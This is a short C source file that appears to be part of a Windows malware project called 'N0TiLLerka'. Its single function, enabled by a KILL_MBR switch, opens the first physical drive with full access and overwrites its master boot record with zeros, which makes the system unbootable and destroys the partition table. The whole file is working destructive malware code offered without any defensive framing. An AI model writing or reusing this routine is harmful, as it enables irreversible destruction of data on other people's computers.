#include "../../../HeaderFiles/N0TiLLerka.h"
#ifdef KILL_MBR

#define MBR_SIZE 512

BOOL OverwriteMBR(VOID) {
	DWORD dwNOBW;
	WCHAR wcMbrData[MBR_SIZE];
	ZeroMemory(&wcMbrData, sizeof(wcMbrData));
	
	HANDLE hMbr = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hMbr) {
		if (!WriteFile(hMbr, wcMbrData, MBR_SIZE, &dwNOBW, NULL)) {
#ifdef DEBUG_MSG
			MessageBox(NULL, L"Couldn't overwrite MBR", L"WriteFile", MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
			CloseHandle(hMbr);
			return FALSE;
		}
	} else {
#ifdef DEBUG_MSG
		MessageBox(NULL, L"Couldn't open MBR", MALWR_NAME, MB_OK | MB_SYSTEMMODAL | MB_ICONERROR);
#endif // DEBUG_MSG
		return FALSE;
	}

	CloseHandle(hMbr);
	return TRUE;
}
#endif // KILL_MBR